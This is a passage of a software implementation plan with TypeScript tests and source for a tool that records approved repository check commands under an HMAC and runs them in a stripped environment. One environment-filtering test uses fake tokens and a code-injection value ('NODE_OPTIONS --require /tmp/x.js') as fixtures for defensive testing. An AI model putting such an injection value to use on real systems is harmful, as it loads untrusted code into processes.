 * says when the working copy holds something else, which is not what runs.
 * Reading them runs nothing.
 */

test("through the host: a project's checks, verbatim, and whether this machine has approved each as the file is now", async (t) => {
  const { host, stateDir, repo } = await evidenceDesk(t)
  await mkdir(join(repo.dir, '.harnessdesk'))
  const file = join(repo.dir, '.harnessdesk', 'checks.yml')
  const commit = async (text: string): Promise<void> => {
    await writeFile(file, text)
    await repo.git('add', '.harnessdesk')
    await repo.git('commit', '-q', '-m', 'checks')
  }
  await commit('verify: { run: pnpm verify, timeout: 1200 }\nlint: { run: pnpm lint }\nodd: { run: pnpm odd, cwd: x }\n')
  const project = await canonical(repo.dir)

  const first = (await host.call('evidence/checks', { project: repo.dir })) as ProjectChecks
  assert.equal(first.project, project)
  assert.equal(first.exists, true)
  assert.deepEqual([first.at, first.uncommitted], [await repo.git('rev-parse', 'HEAD'), false])
  assert.deepEqual(first.checks, [
    { name: 'verify', run: 'pnpm verify', timeout: 1200, seen: 'no' },
    { name: 'lint', run: 'pnpm lint', timeout: 600, seen: 'no' },
  ])
  assert.deepEqual(first.problems.map((one) => one.at), ['odd.cwd'])

  const scope = {
    project,
    incarnation: await incarnationOf(project),
    digest: await repo.git('rev-parse', 'HEAD:.harnessdesk/checks.yml'),
  }
  await new CommandsSeen(join(stateDir, SEEN_FILE)).approve(scope, { name: 'verify', run: 'pnpm verify' })
  const seen = (await host.call('evidence/checks', { project: repo.dir })) as ProjectChecks
  assert.deepEqual(seen.checks.map((one) => [one.name, one.seen]), [['verify', 'yes'], ['lint', 'no']])

  // Edited in the working copy only: nothing changes but the note that it is not what runs.
  await writeFile(file, 'verify: { run: pnpm verify --all }\nlint: { run: pnpm lint }\n')
  const edited = (await host.call('evidence/checks', { project: repo.dir })) as ProjectChecks
  assert.deepEqual(edited.checks.map((one) => [one.name, one.run, one.seen]), [['verify', 'pnpm verify', 'yes'], ['lint', 'pnpm lint', 'no']])
  assert.equal(edited.uncommitted, true)

  // Committed: a changed command says so, and asks again.
  await commit('verify: { run: pnpm verify --all }\nlint: { run: pnpm lint }\n')
  const changed = (await host.call('evidence/checks', { project: repo.dir })) as ProjectChecks
  assert.deepEqual(changed.checks.map((one) => [one.name, one.seen]), [['verify', 'changed'], ['lint', 'no']])
  assert.equal(changed.uncommitted, false)
})

test('through the host: a folder the person did not open is refused before anything is read', async (t) => {
  const { host } = await evidenceDesk(t)
  await assert.rejects(
    host.call('evidence/checks', { project: tempDir('hd-not-opened-') }),
    /is outside every open workspace\. Open its folder first/,
  )
})

test('the wire refuses a checks read that names no project', () => {
  assert.throws(() => parseClientMessage({ id: 1, method: 'evidence/checks', params: { project: '' } }), ValidationError)
  assert.throws(() => parseClientMessage({ id: 1, method: 'evidence/checks', params: {} }), ValidationError)
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Cannot find module '../src/evidence/seen.js'`.

- [ ] **Step 3: What was seen**

Create `packages/server/src/evidence/seen.ts`:

```ts
import { execFile } from 'node:child_process'
import { createHash, createHmac, randomBytes, timingSafeEqual } from 'node:crypto'
import { mkdir, readFile, realpath, rename, stat, writeFile } from 'node:fs/promises'
import { dirname } from 'node:path'
import { promisify } from 'node:util'

import { plainCipher, type CredentialCipher } from '../credentials.js'
import { errnoOf, NOTHING_YET } from '../errno.js'

/**
 * The commands a person has approved on this machine.
 *
 * **Security-critical.** A command a repository names runs only after a
 * person has seen it here, verbatim, and approved it. What is kept is the
 * *current* answer only — one per project and check name — and it counts only
 * while three things still hold:
 *
 * - **The same repository.** A project is its path *and* its incarnation: the
 *   identity on disk of the repository's own git directory. A different
 *   repository cloned into the same path is a different project, and nothing
 *   approved for the old one carries over.
 * - **The same file.** An approval is bound to the checks file's generation —
 *   the committed blob the person was shown (`checks-file.ts`). When the file
 *   is read and has changed in any way — a check added, removed, renamed or
 *   edited, even a comment — every approval for that project is dropped, so an
 *   old answer can never come back to life: a command that went A → B → A asks
 *   three times, and a check removed and added again asks again.
 * - **This machine.** Every entry carries an HMAC under a key only this machine
 *   can read — sealed with the desk's credential cipher, which the desktop app
 *   backs with the OS keychain — so a file copied from elsewhere, or edited by
 *   hand, approves nothing.
 *
 * Its own file, `commands-seen.json` beside `state.json`, with its key in
 * `commands-seen.key`. Never in `state.json`'s preferences, which
 * `app/state/set` patches wholesale and every backup carries and restores; no
 * backup carries either file, and no wire verb writes them but the one that
 * asks. It fails closed: a file that is not there, not JSON, or not verifiable
 * approves nothing; a file a newer build wrote is never written over.
 */

export const SEEN_FILE = 'commands-seen.json'

/** Bumped only when an older build could no longer read the file truthfully. */
const FORMAT = 1

/** The most entries kept. The oldest go first; one that goes asks again, which is the safe way to forget. */
export const SEEN_LIMIT = 1_000

/** Where a question was asked: which repository, and which generation of its checks file. */
export interface ApprovalScope {
  /** The top of the project's main checkout. */
  readonly project: string
  /** Its repository's identity on disk (`incarnationOf`). */
  readonly incarnation: string
  /** The checks file's committed blob id: the generation the person was shown. */
  readonly digest: string
}

interface Approval {
  readonly project: string
  readonly incarnation: string
  readonly name: string
  readonly run: string
  readonly digest: string
  readonly at: number
  readonly mac: string
}

/** What was approved under a name before its file changed: never an approval, only what a question says ran before. */
interface Before {
  readonly project: string
  readonly incarnation: string
  readonly name: string
  readonly run: string
  readonly mac: string
}

interface SeenFile {
  readonly approvals: readonly Approval[]
  readonly before: readonly Before[]
}

const isString = (value: unknown): value is string => typeof value === 'string'

const isApproval = (value: unknown): value is Approval => {
  const one = value as Partial<Approval> | null
  return (
    typeof one === 'object' &&
    one !== null &&
    [one.project, one.incarnation, one.name, one.run, one.digest, one.mac].every(isString) &&
    Number.isFinite(one.at)
  )
}

const isBefore = (value: unknown): value is Before => {
  const one = value as Partial<Before> | null
  return typeof one === 'object' && one !== null && [one.project, one.incarnation, one.name, one.run, one.mac].every(isString)
}

const run = promisify(execFile)

/**
 * A project's incarnation: its repository's git directory — or, outside a
 * repository, the folder itself — named by where it is and what it is on disk
 * (device, inode, and when it was made). A repository deleted and cloned again
 * at the same path is a new directory, so it is a new incarnation.
 */
export const incarnationOf = async (project: string): Promise<string> => {
  let target = project
  try {
    const { stdout } = await run('git', ['-C', project, 'rev-parse', '--path-format=absolute', '--git-common-dir'], {
      timeout: 20_000,
      env: { ...process.env, GIT_OPTIONAL_LOCKS: '0' },
    })
    if (stdout.trim() !== '') target = stdout.trim()
  } catch {
    // Not a repository: the folder is its own identity.
  }
  const real = await realpath(target)
  const info = await stat(real)
  return createHash('sha256')
    .update(JSON.stringify([real, info.dev, info.ino, info.birthtimeMs]))
    .digest('hex')
    .slice(0, 32)
}

export class CommandsSeen {
  readonly #file: string
  readonly #keyFile: string
  readonly #cipher: CredentialCipher
  readonly #now: () => number
  #writes: Promise<void> = Promise.resolve()

  constructor(file: string, options: { readonly cipher?: CredentialCipher; readonly now?: () => number } = {}) {
    this.#file = file
    this.#keyFile = file.replace(/\.json$/, '.key')
    this.#cipher = options.cipher ?? plainCipher
    this.#now = options.now ?? Date.now
  }

  /** Whether this check, exactly as it is in this generation of this repository's file, is approved on this machine. */
  async approved(scope: ApprovalScope, check: { readonly name: string; readonly run: string }): Promise<boolean> {
    await this.#writes
    const { seen, key } = await this.#read()
    return seen.approvals.some(
      (one) =>
        one.project === scope.project &&
        one.incarnation === scope.incarnation &&
        one.digest === scope.digest &&
        one.name === check.name &&
        one.run === check.run &&
        this.#verify(key, one),
    )
  }

  /** The command approved under this name before it changed — what a question says ran before — or null. */
  async previous(scope: ApprovalScope, name: string, run: string): Promise<string | null> {
    await this.#writes
    const { seen, key } = await this.#read()
    const same = (one: { project: string; incarnation: string; name: string }): boolean =>
      one.project === scope.project && one.incarnation === scope.incarnation && one.name === name
    const was =
      seen.approvals.find((one) => same(one) && this.#verify(key, one))?.run ??
      seen.before.find((one) => same(one) && this.#verify(key, one))?.run ??
      null
    return was === run ? null : was
  }

  /**
   * Drops every approval for this project that no longer holds — another
   * repository at its path, another generation of its checks file, a name the
   * file no longer has — keeping each dropped command only as what ran before.
   * Called whenever the file is read, so a change is noticed before anything
   * asks whether a command is approved. Writes only when something changed.
   */
  reconcile(scope: ApprovalScope, names: readonly string[]): Promise<void> {
    return this.#change((seen, key) => {
      const current = new Set(names)
      const approvals: Approval[] = []
      const before = seen.before.filter((one) => one.project !== scope.project || one.incarnation === scope.incarnation)
      let changed = before.length !== seen.before.length
      for (const one of seen.approvals) {
        if (one.project !== scope.project) {
          approvals.push(one)
          continue
        }
        if (one.incarnation !== scope.incarnation) {
          changed = true
          continue
        }
        if (one.digest === scope.digest && current.has(one.name) && this.#verify(key, one)) {
          approvals.push(one)
          continue
        }
        changed = true
        if (this.#verify(key, one)) before.push(this.#seal(key, { project: one.project, incarnation: one.incarnation, name: one.name, run: one.run }))
      }
      return changed ? { approvals, before: this.#keepLast(before) } : null
    }, false)
  }

  /** Records the person's answer, verbatim, now: the only approval this project and name then have. */
  approve(scope: ApprovalScope, check: { readonly name: string; readonly run: string }): Promise<void> {
    return this.#change((seen, key) => {
      const same = (one: { project: string; name: string }): boolean => one.project === scope.project && one.name === check.name
      const replaced = seen.approvals.find((one) => same(one) && this.#verify(key, one))
      const approval = this.#seal(key, {
        project: scope.project,
        incarnation: scope.incarnation,
        name: check.name,
        run: check.run,
        digest: scope.digest,
        at: this.#now(),
      })
      const before = seen.before.filter((one) => !same(one))
      if (replaced && replaced.run !== check.run) {
        before.push(this.#seal(key, { project: replaced.project, incarnation: replaced.incarnation, name: replaced.name, run: replaced.run }))
      }
      return {
        approvals: [...seen.approvals.filter((one) => !same(one)), approval].slice(-SEEN_LIMIT),
        before: this.#keepLast(before),
      }
    }, true)
  }

  /** Every change goes through here, one at a time, and writes aside and renames so a crash leaves one whole file. */
  #change(next: (seen: SeenFile, key: Buffer) => SeenFile | null, mintKey: boolean): Promise<void> {
    const write = this.#writes.then(async () => {
      const read = await this.#read()
      if (read.refused !== null) {
        if (!mintKey) return
        throw new Error(`${read.refused}, so the command you saw could not be recorded, and it was not run.`)
      }
      const key = read.key ?? (mintKey ? await this.#mintKey() : null)
      if (key === null) return
      const changed = next(read.key ? read.seen : { approvals: [], before: [] }, key)
      if (changed === null) return
      await mkdir(dirname(this.#file), { recursive: true })
      const temp = `${this.#file}.${process.pid}.tmp`
      await writeFile(temp, `${JSON.stringify({ version: FORMAT, ...changed }, null, 2)}\n`, { mode: 0o600 })
      await rename(temp, this.#file)
    })
    this.#writes = write.catch(() => {})
    return write
  }

  /** What is recorded, the key that vouches for it, and why nothing may be written when nothing may. */
  async #read(): Promise<{ readonly seen: SeenFile; readonly key: Buffer | null; readonly refused: string | null }> {
    const empty: SeenFile = { approvals: [], before: [] }
    const key = await this.#readKey()
    let raw: string
    try {
      raw = await readFile(this.#file, 'utf8')
    } catch (error) {
      if (NOTHING_YET.has(errnoOf(error))) return { seen: empty, key, refused: null }
      return { seen: empty, key, refused: `${this.#file} could not be read: ${error instanceof Error ? error.message : String(error)}` }
    }
    let parsed: unknown
    try {
      parsed = JSON.parse(raw)
    } catch {
      return { seen: empty, key, refused: null }
    }
    const file = parsed as { version?: unknown; approvals?: unknown; before?: unknown } | null
    if (typeof file !== 'object' || file === null) return { seen: empty, key, refused: null }
    if (typeof file.version === 'number' && file.version > FORMAT) {
      return {
        seen: empty,
        key,
        refused: `${this.#file} was written by a newer HarnessDesk (format ${file.version}; this build reads ${FORMAT})`,
      }
    }
    return {
      seen: {
        approvals: Array.isArray(file.approvals) ? file.approvals.filter(isApproval) : [],
        before: Array.isArray(file.before) ? file.before.filter(isBefore) : [],
      },
      key,
      refused: null,
    }
  }

  /** This machine's key, unsealed — or null when there is none yet, or it was sealed somewhere else. */
  async #readKey(): Promise<Buffer | null> {
    try {
      const hex = this.#cipher.decrypt(await readFile(this.#keyFile))
      return /^[0-9a-f]{64}$/.test(hex) ? Buffer.from(hex, 'hex') : null
    } catch {
      return null
    }
  }

  /** A new key, sealed and kept — replacing one this machine cannot unseal, whose entries could never verify again. */
  async #mintKey(): Promise<Buffer> {
    const key = randomBytes(32)
    await mkdir(dirname(this.#keyFile), { recursive: true })
    const temp = `${this.#keyFile}.${process.pid}.tmp`
    await writeFile(temp, this.#cipher.encrypt(key.toString('hex')), { mode: 0o600 })
    await rename(temp, this.#keyFile)
    return key
  }

  #mac(key: Buffer, fields: readonly unknown[]): string {
    return createHmac('sha256', key).update(JSON.stringify(fields)).digest('hex')
  }

  #seal<T extends { readonly project: string; readonly incarnation: string; readonly name: string; readonly run: string }>(
    key: Buffer,
    entry: T,
  ): T & { readonly mac: string } {
    const { project, incarnation, name, run } = entry
    const bound = entry as unknown as Partial<Pick<Approval, 'digest' | 'at'>>
    const extra = bound.digest === undefined ? [] : [bound.digest, bound.at]
    return { ...entry, mac: this.#mac(key, [project, incarnation, name, run, ...extra]) }
  }

  #verify(key: Buffer | null, entry: Approval | Before): boolean {
    if (key === null) return false
    const extra = 'digest' in entry ? [entry.digest, entry.at] : []
    const expected = Buffer.from(this.#mac(key, [entry.project, entry.incarnation, entry.name, entry.run, ...extra]), 'hex')
    const given = Buffer.from(entry.mac, 'hex')
    return given.length === expected.length && timingSafeEqual(given, expected)
  }

  #keepLast(before: readonly Before[]): Before[] {
    return before.slice(-SEEN_LIMIT)
  }
}
```

- [ ] **Step 4: A project's checks, in the protocol and on the plane**

1. Append to `packages/protocol/src/evidence.ts`:

```ts
/** A project's checks, and whether this machine has seen each command as it is written now. */
export interface ProjectChecks {
  readonly project: string
  /** `.harnessdesk/checks.yml` at the top of the project, absolute. */
  readonly file: string
  readonly exists: boolean
  /** The commit the file was read at: checks run as committed. Null when there is none. */
  readonly at: string | null
  /** The working copy differs from what is committed, and that is not what runs. */
  readonly uncommitted: boolean
  /** `changed`: this machine saw another command under this name, and has not seen this one. */
  readonly checks: readonly (NamedCheck & { readonly seen: 'yes' | 'no' | 'changed' })[]
  /** What is wrong with the file, and where (`verify.run`), or `''` for the file as a whole; `check` names the check it is about. */
  readonly problems: readonly { readonly at: string; readonly text: string; readonly check?: string }[]
}
```

2. In `packages/server/src/evidence/plane.ts`:
   - Change the protocol import to `import type { ProjectChecks, TeamState, WireNotification } from '@harnessdesk/protocol'`. Directly above `import { SeatBook } from './seats.js'`, add:

```ts
import { readChecks } from './checks-file.js'
import { projectOf } from './revision.js'
```

   and directly below it, `import { CommandsSeen, incarnationOf } from './seen.js'`; and above the protocol import, `import type { CredentialCipher } from '../credentials.js'`.
   - In `interface EvidenceOptions`, after `readonly dir: string`, add:

```ts
  /** `commands-seen.json` in the desk's state directory: what a person has approved on this machine. */
  readonly seenFile: string
  /** Seals the key the approvals are signed with; the desktop app's is backed by the OS keychain. */
  readonly cipher?: CredentialCipher
```

   - In the class, after `readonly seats: SeatBook`, add `readonly seen: CommandsSeen`; at the end of the constructor, add:

```ts
    this.seen = new CommandsSeen(options.seenFile, {
      ...(options.cipher ? { cipher: options.cipher } : {}),
      ...(options.now ? { now: options.now } : {}),
    })
```

   and add above `seatedAs`:

```ts
  /**
   * A project's checks, each with whether this machine has approved its
   * command as the file is now: `changed` when it approved another command
   * under that name before the file changed. `folder` may be anywhere in the
   * project; the file is read as committed at the top of its main checkout,
   * and nowhere else. Reading it drops every approval the file no longer
   * holds (`CommandsSeen.reconcile`).
   */
  async projectChecks(folder: string): Promise<ProjectChecks> {
    const project = await projectOf(folder)
    const read = await readChecks(project)
    const checks: ProjectChecks['checks'][number][] = []
    if (read.digest !== null) {
      const scope = { project, incarnation: await incarnationOf(project), digest: read.digest }
      await this.seen.reconcile(
        scope,
        read.checks.map((check) => check.name),
      )
      for (const check of read.checks) {
        const seen = (await this.seen.approved(scope, check))
          ? 'yes'
          : (await this.seen.previous(scope, check.name, check.run)) !== null
            ? 'changed'
            : 'no'
        checks.push({ ...check, seen })
      }
    }
    return {
      project,
      file: read.file,
      exists: read.exists,
      at: read.at,
      uncommitted: read.uncommitted,
      checks,
      problems: read.problems,
    }
  }
```

3. In `packages/server/src/host.ts`, add `import { SEEN_FILE } from './evidence/seen.js'` after the `flowSeatInput` import, and in `new EvidencePlane(…)` replace `{ dir: join(this.#state.directory, 'evidence') },` with the key sealed by the same cipher the host keeps credentials with — the OS keychain in the desktop app:

```ts
      {
        dir: join(this.#state.directory, 'evidence'),
        seenFile: join(this.#state.directory, SEEN_FILE),
        cipher: options.credentialCipher ?? plainCipher,
      },
```

- [ ] **Step 5: The verb**

1. In `packages/protocol/src/wire.ts`, change the evidence import to `import type { ProjectChecks, SeatRecord } from './evidence.js'`, and after the `'evidence/seat'` entry add:

```ts
  /**
   * A project's named checks — `.harnessdesk/checks.yml` at the top of its main
   * checkout, as committed at its `HEAD` — each command verbatim, with whether
   * this machine has approved it for this generation of the file, whether the
   * working copy differs from what is committed, and every problem with the
   * file, where it is. Reads; never runs anything. `project` is held to the
   * folders the person opened.
   */
  'evidence/checks': {
    params: { readonly project: string }
    result: ProjectChecks
  }
```

2. In `packages/protocol/src/wire-validators.ts`, after `'evidence/seat': …,` add `'evidence/checks': shape({ project: isFilled }),`.
3. In `packages/server/src/methods/evidence.ts`, add after the `'evidence/seat'` handler:

```ts

  /* Confined like every folder the renderer names: a project's page can only
     ask about a folder the person opened, or one a conversation works in. */
  'evidence/checks': async (ctx, params) =>
    ctx.evidence.projectChecks(await ctx.workspaces.confineGitRoot(params.project)),
```

4. In `script/check-reachable.mjs`, add to `UNREACHED`:

```js
  'evidence/checks': "a project's page lists its checks, in the second half of the evidence phase",
```

- [ ] **Step 6: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-seen.test.js packages/server/dist/test/evidence-project-checks.test.js packages/server/dist/test/evidence-seats.test.js`
Expected: PASS — 9, 3 and 8 tests.

- [ ] **Step 7: Prove the tests can fail**

1. In `approved`, drop `one.digest === scope.digest &&`: `an approval is one command, under one name, in one project, as one generation of its file says it` fails on `another generation of the file asks`. Restore it.
2. In `reconcile`, change `one.digest === scope.digest && current.has(one.name)` to `current.has(one.name)`: `an approval does not come back when the file returns to an earlier generation without another answer` fails. Restore it.
3. In `#verify`, return `true`: `a file edited by hand, or copied from another machine, approves nothing` fails. Restore it.
4. In `approved`, drop `one.incarnation === scope.incarnation &&`: `…as one generation of its file says it` fails on `another repository at the path asks`. Restore it.
5. In `#read`, return `{ seen: …, key, refused: null }` for a newer format instead of the refusal: `a file a newer build wrote is never written over…` fails. Restore it.

- [ ] **Step 8: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/server/src/evidence/seen.ts packages/protocol/src/evidence.ts packages/server/src/evidence/plane.ts packages/server/src/host.ts packages/server/src/methods/evidence.ts packages/protocol/src/wire.ts packages/protocol/src/wire-validators.ts script/check-reachable.mjs packages/server/test/evidence-seen.test.ts packages/server/test/evidence-project-checks.test.ts
git commit -m "feat(evidence): what this machine has seen run, kept apart, and a project's checks read

An approval is the current answer for one project and check name, and counts
only for the repository it was given in (its path and its git directory's
identity on disk), the generation of the checks file it was given for (the
committed blob id), and this machine (an HMAC under a key sealed by the
credential cipher). Any change to the file drops every approval for the
project, so an old answer never comes back; a copied or edited file approves
nothing; a newer format is never written over. It lives in its own file, never
in the preferences a backup restores, and fails closed. evidence/checks reads
a project's checks as committed, with whether each is approved.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 9: Running a command, and keeping the end of it

> **Runs commands — and, once it has a caller, only `.harnessdesk/checks.yml` commands a person has seen.** Its only caller is `check-runs.ts` (Task 11), which holds the gate: a command reaches `runCommand` only after it has been read strictly (Task 7) and seen on this machine (Task 8), and a changed, added or renamed one asks again first — Task 11's tests pin that, with a marker file for every refusal. This task's own tests run commands the tests write.

A check a person runs from a card has to be able to say why it failed, so its runner keeps the end of what it printed — both streams, in order, colour codes stripped — and its status, or that it ran over its time, or why it never started. Through a shell, because a check is written as it is typed. The flow engine's `runCheck` keeps nothing it prints and is left alone until phase 6 moves flows onto this one.

**What it runs with.** The person's own authority — their files, their network, their tools — as it would in their terminal; the question that approves a command says so (Task 17), and no OS sandbox is built in this phase (*Decisions this plan takes* › *An approved check runs with the person's full authority*, and *Deliberately not in this phase*). What it does not get is the desk's: it starts in a small environment built from `ENVIRONMENT`, an explicit list of names — `PATH`, `HOME`, the user and shell, locale and time zone, `TMPDIR`, and the person's proxy — with `TERM=dumb`, so none of the desk's own variables reach it: not `HARNESSDESK_*`, not a token or key, not a runtime's or the shell app's. A check that needs another variable sets it in its own command, where the person sees it when they approve it.

**What stopping it means.** It runs in its own process group, and a timeout or a quit stops that group: the shell and every process still in it. That is the guarantee, and nothing wider: a process that leaves the group — a daemon, anything in a session of its own — is not stopped, and a desk that ends abruptly stops nothing. A test pins the limit, so nobody reads more into it. A signal already aborted before the spawn starts nothing.

**Files:**
- Create: `packages/server/src/evidence/run.ts`
- Test: `packages/server/test/evidence-run.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: `TAIL_LIMIT` (Task 2's `records.ts`, re-exported here, so a record and the runner agree on one number).
- Produces: `TAIL_LIMIT = 4000`; `ENVIRONMENT` (the names a check's environment is built from); `checkEnvironment(from?: NodeJS.ProcessEnv): NodeJS.ProcessEnv`; `interface CommandRun { exit: number | null; timedOut: boolean; tail: string }`; `runCommand(command: string, where: { cwd: string; timeoutSec: number; signal?: AbortSignal }): Promise<CommandRun>`.

- [ ] **Step 1: Write the failing tests**

Create `packages/server/test/evidence-run.test.ts`:

```ts
import assert from 'node:assert/strict'
import { readFile, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'

import { checkEnvironment, runCommand, TAIL_LIMIT } from '../src/evidence/run.js'
import { tempDir } from './scratch.js'

/*
 * The runner an approved check goes through: its status, the end of what it
 * said, an environment of its own, and its process group stopped with it —
 * the group, and nothing wider.
 */

const alive = (pid: number): boolean => {
  try {
    process.kill(pid, 0)
    return true
  } catch {
    return false
  }
}

/**
 * Whether a process is gone, given a moment. A killed process is reaped by the
 * system rather than at once, and until then a signal 0 still finds it.
 */
const gone = async (pid: number): Promise<boolean> => {
  for (let n = 0; n < 40; n += 1) {
    if (!alive(pid)) return true
    await new Promise((resolve) => setTimeout(resolve, 50))
  }
  return false
}

test('a command exits with its status and the end of what it printed, both streams', async () => {
  const cwd = tempDir('hd-run-')
  assert.deepEqual(await runCommand("printf 'one\\n'; echo two >&2; exit 3", { cwd, timeoutSec: 10 }), {
    exit: 3,
    timedOut: false,
    tail: 'one\ntwo\n',
  })
  assert.equal((await runCommand('true', { cwd, timeoutSec: 10 })).exit, 0)
})

test('a command that runs past its time is stopped, with everything it started', async () => {
  const cwd = tempDir('hd-run-')
  const run = await runCommand('sleep 30 & echo $! > child.pid; wait', { cwd, timeoutSec: 1 })
  assert.equal(run.exit, null)
  assert.equal(run.timedOut, true)
  assert.match(run.tail, /It ran past 1s and was stopped\.$/)
  const child = Number(await readFile(join(cwd, 'child.pid'), 'utf8'))
  assert.equal(await gone(child), true, 'the child it started went with it')
})

test('a child still holding its output after the shell exits does not hold the check open', async () => {
  const cwd = tempDir('hd-run-')
  const started = Date.now()
  const run = await runCommand('sleep 30 & echo $! > child.pid; exit 0', { cwd, timeoutSec: 20 })
  assert.equal(run.exit, 0)
  assert.ok(Date.now() - started < 5_000, 'it answered once the shell was done, not when the child was')
  assert.equal(await gone(Number(await readFile(join(cwd, 'child.pid'), 'utf8'))), true)
})

test('a command that could not start says why, and has no status', async () => {
  const run = await runCommand('true', { cwd: join(tempDir('hd-run-'), 'not-here'), timeoutSec: 5 })
  assert.equal(run.exit, null)
  assert.equal(run.timedOut, false)
  assert.match(run.tail, /^It did not start: /)
})

test('only the last of a long output is kept, and without its colour codes', async () => {
  const cwd = tempDir('hd-run-')
  const script = "i=0; while [ $i -lt 3000 ]; do echo line-$i; i=$((i+1)); done; printf '\\033[31mcolour-sentinel\\033[0m\\n'"
  const run = await runCommand(script, { cwd, timeoutSec: 20 })
  assert.equal(run.exit, 0)
  assert.equal(run.tail.length, TAIL_LIMIT)
  assert.ok(run.tail.includes('colour-sentinel'))
  assert.equal(run.tail.includes('\x1b'), false)
})

test('a check the desk stops is stopped at once, with everything it started', async () => {
  const cwd = tempDir('hd-run-')
  const stop = new AbortController()
  const running = runCommand('sleep 30 & echo $! > child.pid; wait', { cwd, timeoutSec: 60, signal: stop.signal })
  await new Promise((resolve) => setTimeout(resolve, 300))
  stop.abort()
  const run = await running
  assert.equal(run.exit, null)
  assert.equal(run.timedOut, false)
  assert.match(run.tail, /It was stopped: the desk closed\.$/)
  assert.equal(await gone(Number(await readFile(join(cwd, 'child.pid'), 'utf8'))), true)
})

test("a check's environment is built from a short list of names: nothing else of the desk's reaches it", () => {
  const desk = {
    PATH: '/usr/bin:/bin',
    HOME: '/home/alice',
    LANG: 'en_GB.UTF-8',
    TERM: 'xterm-256color',
    HARNESSDESK_HOME: '/home/alice/.harnessdesk',
    HARNESSDESK_PORT: '4870',
    GITHUB_TOKEN: 'ghp_secret',
    GH_TOKEN: 'gho_secret',
    ANTHROPIC_API_KEY: 'sk-ant-secret',
    OPENAI_API_KEY: 'sk-secret',
    NODE_OPTIONS: '--require /tmp/x.js',
    ELECTRON_RUN_AS_NODE: '1',
    CLAUDECODE: '1',
  }
  assert.deepEqual(checkEnvironment(desk), { TERM: 'dumb', PATH: '/usr/bin:/bin', HOME: '/home/alice', LANG: 'en_GB.UTF-8' })
})

test("the command itself sees only that environment: a secret in the desk's is not there", async (t) => {
  const names = ['HARNESSDESK_HOME', 'HARNESSDESK_CORRELATION', 'GITHUB_TOKEN', 'ANTHROPIC_API_KEY', 'NODE_OPTIONS']
  const before = Object.fromEntries(names.map((name) => [name, process.env[name]]))
  t.after(() => {
    for (const [name, value] of Object.entries(before)) {
      if (value === undefined) delete process.env[name]
      else process.env[name] = value
    }
  })
  for (const name of names) process.env[name] = name === 'NODE_OPTIONS' ? '--no-warnings' : `canary-${name}`
  const run = await runCommand('env', { cwd: tempDir('hd-run-'), timeoutSec: 10 })
  assert.equal(run.exit, 0)
  const seen = new Set(run.tail.split('\n').map((line) => line.split('=')[0]))
  for (const name of names) assert.equal(seen.has(name), false, `${name} reached the check`)
  assert.equal(run.tail.includes('canary-'), false)
  assert.ok(seen.has('PATH') && seen.has('HOME'), 'what a command needs to find its tools is there')
  assert.match(run.tail, /^TERM=dumb$/m)
})

test('a process that leaves the group is not stopped with it: the guarantee is the group, and nothing wider', async (t) => {
  const cwd = tempDir('hd-run-')
  // A daemon: a process in a session of its own, which a group kill does not reach.
  await writeFile(
    join(cwd, 'escape.cjs'),
    `const { spawn } = require('node:child_process')
const child = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 30000)'], { detached: true, stdio: 'ignore' })
require('node:fs').writeFileSync('escaped.pid', String(child.pid))
child.unref()
`,
  )
  const run = await runCommand(`${JSON.stringify(process.execPath)} escape.cjs; sleep 30`, { cwd, timeoutSec: 1 })
  assert.equal(run.timedOut, true)
  const escaped = Number(await readFile(join(cwd, 'escaped.pid'), 'utf8'))
  t.after(() => {
    try {
      process.kill(escaped, 'SIGKILL')
    } catch {
      // Gone already.
    }
  })
  assert.equal(alive(escaped), true, 'this is the documented limit, not a promise: a daemon outlives its check')
})

test('a check asked to start after the desk has begun closing never starts', async () => {
  const cwd = tempDir('hd-run-')
  const stop = new AbortController()
  stop.abort()
  const run = await runCommand('touch started', { cwd, timeoutSec: 10, signal: stop.signal })
  assert.deepEqual(run, { exit: null, timedOut: false, tail: 'It was stopped: the desk closed.' })
  await assert.rejects(readFile(join(cwd, 'started')))
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Cannot find module '../src/evidence/run.js'`.

- [ ] **Step 3: The runner**

Create `packages/server/src/evidence/run.ts`. Its two patterns are written with `\x` escapes:

```ts
import { spawn, type ChildProcess } from 'node:child_process'

import { TAIL_LIMIT } from './records.js'

export { TAIL_LIMIT }

/**
 * Runs one command the way a person would type it, and keeps the end of what
 * it printed.
 *
 * Through a shell, because a check is written as it is typed — `pnpm verify`,
 * `cargo test && cargo clippy`. Only ever called with a command a person has
 * seen, verbatim, on this machine, and approved (`check-runs.ts`).
 *
 * **What it runs with.** The person's own authority — their files, their
 * network, their tools — as it would in their terminal; the question that
 * approves a command says so. What it does not get is the desk's: it starts in
 * a small environment built from `ENVIRONMENT`, a list of names, so none of the
 * desk's own variables — its state paths, its port, its tokens, anything a
 * runtime or the shell app put into the desk's environment — reaches it.
 *
 * **What stopping it means.** It runs in its own process group, and a timeout
 * or a quit stops that group: the shell and every process that stays in it. A
 * process that leaves the group — a daemon, anything started in a session of
 * its own — is not stopped, and a desk that ends abruptly stops nothing. The
 * guarantee is the group, and nothing wider.
 *
 * The flow engine's `runCheck` (`flows.ts`) keeps nothing of what a command
 * prints; a check a person runs from a card has to be able to say why it
 * failed. Phase 6 moves flows onto this one.
 */

/**
 * The only variables a check's environment is built from, taken from the
 * desk's own when it has them: where tools are found, whose account it is, the
 * locale and time zone, where temporary files go, and the person's own proxy.
 * Nothing else passes — not the desk's `HARNESSDESK_*`, not a token or key,
 * not an agent's variables. `TERM` is always `dumb`: nobody is watching a
 * terminal.
 */
export const ENVIRONMENT = [
  'PATH',
  'HOME',
  'USER',
  'LOGNAME',
  'SHELL',
  'LANG',
  'LANGUAGE',
  'LC_ALL',
  'LC_CTYPE',
  'LC_MESSAGES',
  'TZ',
  'TMPDIR',
  'HTTP_PROXY',
  'HTTPS_PROXY',
  'NO_PROXY',
  'http_proxy',
  'https_proxy',
  'no_proxy',
] as const

